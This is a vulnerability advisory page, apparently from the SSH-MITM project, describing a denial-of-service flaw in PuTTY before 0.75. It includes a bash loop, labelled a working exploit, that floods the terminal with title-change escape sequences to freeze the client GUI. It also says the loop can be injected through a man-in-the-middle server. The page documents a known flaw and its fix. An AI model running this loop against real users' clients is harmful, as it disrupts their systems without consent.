PuTTY < v0.75 DoS
=================

.. raw:: html

    <div class="card card-margin">
        <div class="card-header no-border">
            <h5 class="card-title cve-title">PuTTY &lt; v0.75 DoS</h5>
        </div>
        <div class="card-body pt-0">
            <div class="widget-49">
                <div class="widget-49-title-wrapper">
                    <div class="widget-49-date-primary">
                        <span class="widget-49-date-day">7.5</span>
                        <span class="widget-49-date-month">CVSS</span>
                    </div>
                    <div class="widget-49-meeting-info">
                        <span class="widget-49-pro-title"><b>Vector:</b> CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</span>
                        <span class="widget-49-meeting-time">
                            <a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/changes.html">https://www.chiark.greenend.org.uk/~sgtatham/putty/changes.html</a>
                        </span>
                    </div>
                </div>
                <p class="widget-49-meeting-integration">
                    <i class="fas fa-check"></i> integrated in <a href="https://github.com/ssh-mitm/ssh-mitm-plugins/blob/main/ssh_mitm_plugins/ssh/putty_dos.py">SSH-MITM plugins</a>
                </p>
                <p class="widget-49-meeting-text">
                    A server could DoS the whole Windows/Linux GUI by telling
                    the PuTTY window to change its title repeatedly at high speed.
                </p>
                <span class="widget-49-pro-title"><b>Affected Software:</b></span>
                <ul class="widget-49-meeting-points">
                    <li class="widget-49-meeting-item"><b>PuTTY</b> &lt; 0.75</li>
                </ul>
            </div>
        </div>
    </div>

Description
-----------

A vulnerability in PuTTY < 0.75 freezes the entire, leading inevitably to a manual restart. This happens when executing
a simple command to repeatedly change the terminals title.

Set window title from terminal:

.. code-block:: bash
    :linenos:

    $ PS1=''
    echo -ne "\033]0; NEW_TITLE \007"

Thus, an working exploit would be:

.. code-block:: bash
    :linenos:

    $ PS1=''
    while :
    > do
    > echo -ne "\033]0; NEW_TITLE${RANDOM}  \007"
    > done


Using the injection functionality of the mitm Server, this exploit can be executed immediately when a client connects
to the mitm server via PuTTY.

Mitigation
----------

Update PuTTY to version >= 0.75